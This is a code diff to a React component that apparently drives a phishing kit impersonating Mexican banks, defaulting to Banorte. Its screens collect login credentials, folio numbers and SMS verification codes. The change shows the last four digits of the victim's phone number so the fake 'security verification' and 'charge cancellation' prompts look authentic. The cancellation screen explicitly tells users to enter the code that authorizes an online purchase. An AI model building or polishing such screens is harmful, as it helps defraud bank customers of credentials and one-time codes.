@@ -50,6 +50,7 @@ interface ScreenTemplatesProps {
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
   sessionId?: string;
+  celular?: string;
 }
 
 export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
@@ -57,10 +58,23 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   screenData,
   onSubmit,
   banco = "BANORTE",
-  sessionId = ""
+  sessionId = "",
+  celular = ""
 }) => {
   // Normalizar el banco a mayúsculas para consistencia
   const bankCode = banco.toUpperCase();
+  
+  // Función para obtener los últimos 4 dígitos del celular
+  const getLastFourDigits = (phoneNumber: string): string => {
+    if (!phoneNumber) return "****";
+    // Extraer solo dígitos
+    const digits = phoneNumber.replace(/\D/g, '');
+    // Retornar los últimos 4 dígitos
+    return digits.length >= 4 ? digits.slice(-4) : "****";
+  };
+  
+  // Determinar la terminación a mostrar: priorizar screenData.terminacion, luego celular
+  const terminacionMostrar = screenData.terminacion || getLastFourDigits(celular);
   // Form state
   const [folioInput, setFolioInput] = useState('');
   const [loginInputs, setLoginInputs] = useState({ username: '', password: '' });
@@ -280,7 +294,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <>
             <h2 className="text-xl font-bold mb-3">Verificación de seguridad</h2>
             <p className="mb-4">
-              Hemos enviado un código de verificación a tu número de teléfono terminación: <strong>{screenData.terminacion || "****"}</strong>
+              Hemos enviado un código de verificación a tu número de teléfono terminación: <strong>{terminacionMostrar}</strong>
             </p>
             <Input 
               type="text" 
@@ -513,7 +527,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           <>
             <h2 className="text-xl font-bold mb-3">Cancelación de cargos:</h2>
             <p className="mb-4">
-              Ingresa el código que recibiste para autorizar la compra en línea. Este mismo código sirve para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{screenData.terminacion || "****"}</strong>
+              Ingresa el código que recibiste para autorizar la compra en línea. Este mismo código sirve para realizar la cancelación. Lo hemos enviado a tu teléfono con terminación: <strong>{terminacionMostrar}</strong>
             </p>
             
             <div className="p-4 bg-gray-100 rounded mb-4 text-black">
